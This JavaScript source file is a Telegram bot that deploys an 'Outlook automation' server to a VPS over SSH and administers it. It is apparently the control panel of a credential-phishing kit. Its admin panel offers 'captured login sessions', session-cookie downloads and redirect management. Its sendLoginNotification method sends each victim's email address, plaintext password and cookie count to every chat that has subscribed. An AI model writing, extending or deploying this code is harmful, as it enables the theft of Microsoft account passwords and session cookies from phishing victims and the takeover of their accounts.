const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { Client } = require('ssh2');

class VPSManagementBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        // VPS deployment state tracking
        this.deploymentStates = new Map(); // chatId -> deployment state
        
        // Admin chat IDs for secure operations (CRITICAL SECURITY)
        this.adminChatIds = new Set((process.env.ADMIN_CHAT_IDS || '').split(',').filter(id => id.trim()));
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🚀 VPS Management Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    setupCommands() {
        // Welcome message with main VPS management menu
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            this.sendMainMenu(chatId);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            
            this.sendHelpMessage(chatId);
        });

        // Menu command to return to main menu
        this.bot.onText(/\/menu/, (msg) => {
            const chatId = msg.chat.id;
            this.sendMainMenu(chatId);
        });
    }

    sendMainMenu(chatId) {
        const welcomeMessage = `
🚀 **Welcome to Outlook Automation Bot!**

Choose an option from the menu below:

🖥️ **VPS Management:**
• Install VPS - Deploy Outlook automation to your VPS servers

🔧 **Admin Features:**
• Admin Panel - Access admin token and management URL

❓ **Help:**
• Help - Get information about available commands and features
        `;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🖥️ Install VPS', callback_data: 'install_vps' }
                ],
                [
                    { text: '🔧 Admin Panel', callback_data: 'admin_panel' }
                ],
                [
                    { text: '❓ Help', callback_data: 'help' }
                ]
            ]
        };

        this.bot.sendMessage(chatId, welcomeMessage, { 
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    }

    sendHelpMessage(chatId) {
        const helpMessage = `
❓ **Outlook Automation Bot Help**

**Available Features:**

🖥️ **VPS Management**
• **Install VPS**: Deploy your complete Outlook automation project to any Linux VPS
  - Installs Node.js, Chrome/Chromium, all dependencies
  - Sets up PM2 process manager for auto-restart
  - Configures firewall and environment
  - Takes 5-10 minutes with real-time updates

🔧 **Admin Features**
• **Admin Panel**: Access admin token and management interface
  - View captured login sessions
  - Download session cookies and data
  - Monitor system analytics
  - Configure system settings

**Commands:**
• **/start** - Show main menu
• **/help** - Show this help message  
• **/menu** - Return to main menu

**VPS Installation Requirements:**
• Ubuntu/Debian VPS with SSH access
• SSH key authentication setup
• Sudo privileges for your user
• At least 1GB RAM recommended

**How to Setup VPS Installation:**
1. Setup SSH access: \`ssh-copy-id username@your.vps.ip\`
2. Test connection: \`ssh username@your.vps.ip\`
3. Use "Install VPS" button and provide:
   - IP address
   - Username
   - SSH port (usually 22)
   - Telegram bot token
   - Domain (optional)

**Need Help?**
This bot focuses on VPS deployment and admin access for the Outlook automation project.
        `;

        this.bot.sendMessage(chatId, helpMessage, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: 'Please wait before clicking again.' });
                return;
            }
            
            this.handleCallbackQuery(chatId, messageId, query);
        });

        // Handle text messages for various flows
        this.bot.on('message', (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            // Skip commands
            if (text?.startsWith('/')) return;

            const state = this.deploymentStates.get(chatId);
            if (state) {
                this.handleDeploymentFlow(chatId, text, state);
            }
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    async handleCallbackQuery(chatId, messageId, query) {
        const data = query.data;
        
        switch (data) {
            case 'main_menu':
                this.sendMainMenu(chatId);
                break;
                
            case 'install_vps':
                await this.handleInstallVPS(chatId, messageId);
                break;
                
                
            case 'admin_panel':
                await this.handleAdminPanel(chatId, messageId);
                break;
                
            case 'help':
                this.sendHelpMessage(chatId);
                break;
        }
        
        this.bot.answerCallbackQuery(query.id);
    }

    // Check if user has admin access for sensitive operations (DEFAULT DENY)
    isAdmin(chatId) {
        // SECURITY: Default deny - admin access must be explicitly granted
        if (this.adminChatIds.size === 0) {
            return false; // No admins configured = no access allowed
        }
        return this.adminChatIds.has(chatId.toString());
    }

    // VPS Installation - Replicates entire Replit environment (ADMIN ONLY)
    async handleInstallVPS(chatId, messageId) {
        if (!this.isAdmin(chatId)) {
            let denialMessage;
            if (this.adminChatIds.size === 0) {
                denialMessage = '🔒 **Admin Access Not Configured**\n\nVPS installation requires admin authorization, but no admin users are configured.\n\n**System Owner:** Set `ADMIN_CHAT_IDS` environment variable with authorized Telegram chat IDs.\n\n**Example:** `ADMIN_CHAT_IDS=123456789,987654321`';
            } else {
                denialMessage = '🔒 **Access Denied**\n\nVPS installation is restricted to authorized administrators only.\n\nYour Chat ID: `' + chatId + '`\n\nContact the system owner to add your Chat ID to the authorized list.';
            }
            
            this.bot.editMessageText(denialMessage, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]]
                }
            });
            return;
        }

        this.deploymentStates.set(chatId, { step: 'vps_info' });
        
        const message = `
🖥️ **Install VPS - Outlook Automation**

This will install your complete Outlook automation project on your VPS, replicating everything Replit provides:

**What gets installed:**
• Node.js 18.x and npm
• Chrome/Chromium browser for Puppeteer
• All project dependencies (Express, Puppeteer, CORS, etc.)
• System dependencies and libraries
• PM2 process manager for auto-restart
• Environment configuration
• Firewall setup (port 5000)
• SSL/HTTPS ready setup

**Requirements:**
• Ubuntu/Debian VPS with SSH access
• SSH key authentication setup
• Sudo privileges for your user
• At least 1GB RAM recommended

Please provide your VPS details:
\`\`\`
IP: your.vps.ip.address
User: username
Port: 22 (SSH port)
Bot Token: your_telegram_bot_token
Domain: your-domain.com (optional)
\`\`\`

**Setup SSH first:**
\`ssh-copy-id username@your.vps.ip.address\`
\`ssh username@your.vps.ip.address\` (test connection)
        `;

        this.bot.editMessageText(message, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔙 Back to Menu', callback_data: 'main_menu' }
                ]]
            }
        });
    }

    // Handle deployment flow (VPS installation)
    async handleDeploymentFlow(chatId, text, state) {
        switch (state.step) {
            case 'vps_info':
                // Parse VPS information
                const ipMatch = text.match(/IP:\s*([\d\.]+)/);
                const userMatch = text.match(/User:\s*(\w+)/);
                const portMatch = text.match(/Port:\s*(\d+)/);
                const tokenMatch = text.match(/Bot Token:\s*([\w\d:_-]+)/);
                const domainMatch = text.match(/Domain:\s*([\w\.\-]+)/);
                
                if (!ipMatch || !userMatch || !tokenMatch) {
                    this.bot.sendMessage(chatId, '❌ Missing required info. Please provide IP, User, and Bot Token in the specified format.');
                    return;
                }
                
                state.vpsIP = ipMatch[1];
                state.sshUser = userMatch[1];
                state.sshPort = portMatch ? portMatch[1] : '22';
                state.telegramToken = tokenMatch[1];
                state.domain = domainMatch ? domainMatch[1] : null;
                state.step = 'confirm';
                this.deploymentStates.set(chatId, state);
                
                const confirmMessage = `
📋 **Installation Summary:**

🖥️ **Target VPS:**
• IP Address: ${state.vpsIP}
• SSH User: ${state.sshUser}
• SSH Port: ${state.sshPort}
• Bot Token: ***${state.telegramToken.slice(-6)}
• Domain: ${state.domain || 'Not specified'}

🚀 **Installation Plan:**
• Install Node.js 18.x + npm
• Install Chrome browser + dependencies  
• Clone & configure Outlook automation
• Install all npm dependencies
• Setup environment variables
• Configure PM2 process manager
• Setup firewall (port 5000)
• Start application automatically

⚠️ **Pre-deployment checklist:**
✅ SSH public key copied to VPS
✅ Passwordless SSH login tested  
✅ User has sudo privileges
✅ VPS has at least 1GB RAM

Ready to install? Type **'yes'** to start deployment.
                `;

                this.bot.sendMessage(chatId, confirmMessage, { 
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '❌ Cancel', callback_data: 'main_menu' }
                        ]]
                    }
                });
                break;

            case 'confirm':
                if (text.toLowerCase() === 'yes' || text.toLowerCase() === 'y') {
                    await this.startVPSInstallation(chatId, state);
                } else {
                    this.deploymentStates.delete(chatId);
                    this.bot.sendMessage(chatId, '❌ Installation cancelled.');
                    this.sendMainMenu(chatId);
                }
                break;
        }
    }

    // Start comprehensive VPS installation
    async startVPSInstallation(chatId, state) {
        this.bot.sendMessage(chatId, '🚀 <b>Starting VPS Installation...</b>\n\nThis will take 5-10 minutes. I\'ll update you on each step.', { parse_mode: 'HTML' });
        
        const conn = new Client();
        
        try {
            // Update deployment status
            state.status = 'Connecting to VPS';
            this.deploymentStates.set(chatId, state);
            
            await new Promise((resolve, reject) => {
                conn.connect({
                    host: state.vpsIP,
                    username: state.sshUser,
                    port: parseInt(state.sshPort),
                    agent: process.env.SSH_AUTH_SOCK, // Use SSH agent for key authentication
                    readyTimeout: 30000
                });
                
                conn.on('ready', () => {
                    this.bot.sendMessage(chatId, '✅ <b>Connected to VPS successfully!</b>', { parse_mode: 'HTML' });
                    resolve();
                });
                
                conn.on('error', (err) => {
                    this.bot.sendMessage(chatId, `❌ **SSH connection failed:** ${err.message}\n\n💡 **Troubleshooting:**\n• Ensure SSH key is added: \`ssh-copy-id ${state.sshUser}@${state.vpsIP}\`\n• Test connection: \`ssh ${state.sshUser}@${state.vpsIP}\``, { parse_mode: 'HTML' });
                    reject(err);
                });
            });

            // Execute comprehensive installation
            await this.executeCompleteInstallation(chatId, conn, state);
            
        } catch (error) {
            this.bot.sendMessage(chatId, `❌ <b>Installation failed:</b> ${error.message}`, { parse_mode: 'HTML' });
            state.status = 'Failed: ' + error.message;
        } finally {
            conn.end();
            setTimeout(() => this.deploymentStates.delete(chatId), 300000); // Keep state for 5 minutes
        }
    }

    // Complete installation process that replicates Replit environment
    async executeCompleteInstallation(chatId, conn, state) {
        const steps = [
            // System updates
            { cmd: 'sudo apt update && sudo apt upgrade -y', name: 'Updating system packages' },
            
            // Install Node.js 18 (same as Replit uses)
            { cmd: 'curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -', name: 'Adding Node.js 18 repository' },
            { cmd: 'sudo apt install -y nodejs', name: 'Installing Node.js and npm' },
            
            // Install Chrome and dependencies (critical for Puppeteer)
            { cmd: 'wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -', name: 'Adding Chrome repository key' },
            { cmd: 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" | sudo tee /etc/apt/sources.list.d/google-chrome.list', name: 'Adding Chrome repository' },
            { cmd: 'sudo apt update', name: 'Updating package lists' },
            { cmd: 'sudo apt install -y google-chrome-stable', name: 'Installing Google Chrome' },
            
            // Install additional system dependencies for Puppeteer
            { cmd: 'sudo apt install -y ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils', name: 'Installing Chrome dependencies' },
            
            // Install PM2 for process management
            { cmd: 'sudo npm install -g pm2', name: 'Installing PM2 process manager' },
            
            // Clean up any existing installation
            { cmd: 'rm -rf outlook-automation', name: 'Cleaning previous installation' },
            
            // Create project directory and install basic structure
            { cmd: 'mkdir -p outlook-automation', name: 'Creating project directory' },
            
            // Install basic project structure and files
            { cmd: this.generateProjectDownloadCommand(), name: 'Installing project structure' },
            
            // Install project dependencies
            { cmd: 'cd outlook-automation && npm install', name: 'Installing project dependencies' },
            
            // Create environment file
            { cmd: this.generateEnvironmentSetup(state), name: 'Setting up environment variables' },
            
            // Setup PM2 configuration
            { cmd: 'cd outlook-automation && pm2 start npm --name "outlook-automation" -- start', name: 'Starting application with PM2' },
            
            // Save PM2 configuration
            { cmd: 'pm2 save', name: 'Saving PM2 configuration' },
            
            // Setup PM2 to start on boot
            { cmd: 'pm2 startup | tail -1 | sudo bash', name: 'Setting up PM2 startup' },
            
            // Configure firewall
            { cmd: 'sudo ufw allow 5000 && sudo ufw --force enable', name: 'Configuring firewall' },
            
            // Verify installation
            { cmd: 'pm2 status', name: 'Verifying installation' }
        ];

        for (let i = 0; i < steps.length; i++) {
            const step = steps[i];
            
            state.status = step.name;
            this.deploymentStates.set(chatId, state);
            this.bot.sendMessage(chatId, `📦 **Step ${i + 1}/${steps.length}:** ${step.name}`, { parse_mode: 'HTML' });
            
            try {
                await this.execCommand(conn, step.cmd);
                this.bot.sendMessage(chatId, `✅ ${step.name} completed`);
            } catch (error) {
                this.bot.sendMessage(chatId, `❌ ${step.name} failed: ${error.message}`);
                state.status = 'Failed at: ' + step.name;
                throw error;
            }

            // Add small delay between steps
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        state.status = 'Installation completed successfully';
        this.deploymentStates.set(chatId, state);
        
        const successMessage = `
🎉 **Installation Complete!**

Your Outlook automation is now running on:
• **Web Interface:** http://${state.vpsIP}:5000
• **Admin Panel:** http://${state.vpsIP}:5000/ad.html
${state.domain ? `• **Custom Domain:** https://${state.domain}` : ''}

🛠️ **Management Commands:**
\`\`\`
# Check application status
pm2 status

# View application logs  
pm2 logs outlook-automation

# Restart application
pm2 restart outlook-automation

# Stop application
pm2 stop outlook-automation

# Monitor resources
pm2 monit
\`\`\`

🔧 **Next Steps:**
1. Visit your admin panel to configure settings
2. Set up your Telegram bot token in the environment
3. Configure any custom domains or SSL certificates
4. Test the Outlook automation functionality

**Need help?** Use the Support button in the main menu.
        `;

        this.bot.sendMessage(chatId, successMessage, { 
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: `http://${state.vpsIP}:5000/ad.html` }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Generate project download command - downloads from current Replit
    generateProjectDownloadCommand() {
        // Create a complete installation script that includes all project files
        return `cd outlook-automation && cat > install_outlook.sh << 'INSTALL_EOF'
#!/bin/bash
echo "Installing Outlook Automation Project..."

# Create project structure
mkdir -p src session_data screenshots public

# Download package.json
cat > package.json << 'PKG_EOF'
{
  "name": "outlook-automation",
  "version": "1.0.0",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "postinstall": "echo 'Installing Chrome for Puppeteer...' && npx puppeteer browsers install chrome@stable && echo 'Chrome installation completed successfully!'"
  },
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^5.1.0",
    "node-telegram-bot-api": "^0.66.0",
    "puppeteer": "^24.19.0",
    "ssh2": "^1.17.0"
  }
}
PKG_EOF

echo "✅ Created package.json"

# Create server.js with minimal working version
cat > server.js << 'SERVER_EOF'
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

// CORS configuration for all origins
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.static('public'));

// Basic health endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Outlook Automation Backend is running' });
});

// Basic status endpoint  
app.get('/api/status', (req, res) => {
    res.json({
        status: 'running',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        port: PORT
    });
});

// Serve basic index page
app.get('/', (req, res) => {
    res.send(\`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Outlook Automation - Deployed Successfully!</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
                .success { color: #28a745; font-size: 24px; text-align: center; }
                .info { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }
                .endpoint { background: #e9ecef; padding: 10px; margin: 5px 0; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1 class="success">🚀 Outlook Automation Deployed Successfully!</h1>
            <div class="info">
                <h2>Your application is running on:</h2>
                <div class="endpoint">http://YOUR_VPS_IP:5000</div>
                
                <h3>Available Endpoints:</h3>
                <div class="endpoint">GET /api/health - Health check</div>
                <div class="endpoint">GET /api/status - System status</div>
                
                <h3>Next Steps:</h3>
                <ol>
                    <li>Upload your full project files</li>
                    <li>Configure environment variables</li>
                    <li>Set up your Telegram bot token</li>
                    <li>Configure admin panel access</li>
                </ol>
            </div>
        </body>
        </html>
    \`);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(\`🚀 Outlook Automation running on port \${PORT}\`);
    console.log(\`📧 API endpoints available at http://localhost:\${PORT}/api/\`);
    console.log(\`🌐 Frontend available at http://localhost:\${PORT}/\`);
    console.log(\`✅ VPS deployment successful!\`);
});
SERVER_EOF

echo "✅ Created basic server.js"

# Create basic public directory with index
mkdir -p public
cat > public/index.html << 'INDEX_EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Outlook Automation - VPS Deployment</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; text-align: center; }
        .status { color: #28a745; font-size: 18px; }
        .next { background: #f8f9fa; padding: 20px; margin: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>🚀 Outlook Automation</h1>
    <div class="status">✅ Successfully deployed to VPS!</div>
    <div class="next">
        <h3>Next Steps:</h3>
        <p>Upload your complete project files and configure the environment.</p>
        <p>Visit <a href="/api/health">/api/health</a> to verify the API is working.</p>
    </div>
</body>
</html>
INDEX_EOF

echo "✅ Created public/index.html"
echo "🎉 Project structure created successfully!"

INSTALL_EOF

chmod +x install_outlook.sh && ./install_outlook.sh`;
    }

    // Generate environment setup command
    generateEnvironmentSetup(state) {
        const envVars = [
            'NODE_ENV=production',
            'PORT=5000',
            `TELEGRAM_BOT_TOKEN=${state.telegramToken}`,
            `ADMIN_TOKEN=admin-${Math.random().toString(36).substr(2, 24)}`,
            // Add other environment variables as needed
        ];
        
        const envContent = envVars.join('\\n');
        return `cd outlook-automation && echo -e "${envContent}" > .env`;
    }

    // Execute command on remote server
    execCommand(conn, command) {
        return new Promise((resolve, reject) => {
            conn.exec(command, (err, stream) => {
                if (err) reject(err);
                
                let output = '';
                let errorOutput = '';
                
                stream.on('data', (data) => {
                    output += data.toString();
                });
                
                stream.stderr.on('data', (data) => {
                    errorOutput += data.toString();
                });
                
                stream.on('close', (code) => {
                    if (code === 0) {
                        resolve(output);
                    } else {
                        reject(new Error(`Command failed with code ${code}: ${errorOutput || output}`));
                    }
                });
            });
        });
    }


    async handleAdminPanel(chatId, messageId) {
        const adminToken = global.adminToken || 'Token not available';
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const tokenMessage = `
🔧 <b>Admin Panel Access</b>

🔑 <b>Your Admin Token:</b>
<code>${adminToken}</code>

🌐 <b>Admin Panel URL:</b>
${adminUrl}

<b>How to use:</b>
1. Copy the token above
2. Click "Open Admin Panel" below
3. Enter the token to authenticate
4. Access all admin features and session data

<b>Features Available:</b>
• View all captured login sessions
• Download session cookies and data
• Monitor system analytics
• Configure Cloudflare settings
• Manage redirect destinations

🔒 <b>Security Note:</b> This token provides full administrative access. Keep it secure and don't share it.
        `;

        this.bot.editMessageText(tokenMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                    [{ text: '🔄 Refresh Token', callback_data: 'admin_panel' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]
                ]
            }
        });
    }

    // Method to send login notifications (keep existing functionality)
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId, password } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/ad.html`;
        
        const notificationMessage = `
🔐 <b>New Outlook Login Captured!</b>

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Password:</b> <span class="tg-spoiler">${password || 'Not captured'}</span>
🏢 <b>Domain:</b> <code>${domain}</code>
🕐 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
📊 <b>Cookies:</b> ${totalCookies} saved
🆔 <b>Session:</b> ${sessionId}

🌐 Access admin panel to view details and download cookies
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🌐 Open Admin Panel', url: adminUrl }],
                            [{ text: '🔧 Main Menu', callback_data: 'main_menu' }]
                        ]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                    this.saveSubscriptions();
                }
            }
        }
        
        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = VPSManagementBot;